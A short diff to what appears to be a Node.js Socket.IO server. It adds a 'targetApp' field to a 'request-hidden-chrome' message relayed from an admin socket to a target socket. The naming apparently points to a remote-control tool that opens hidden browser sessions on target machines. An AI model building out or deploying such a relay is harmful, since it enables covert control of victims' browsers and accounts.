@@ -92,7 +92,7 @@ io.on('connection', (socket) => {
     if (typeof data === 'string') {
         io.to(data).emit('request-hidden-chrome', socket.id);
     } else {
-        io.to(data.targetId).emit('request-hidden-chrome', { adminId: socket.id, profileName: data.profileName });
+        io.to(data.targetId).emit('request-hidden-chrome', { adminId: socket.id, profileName: data.profileName, targetApp: data.targetApp });
     }
   });
 
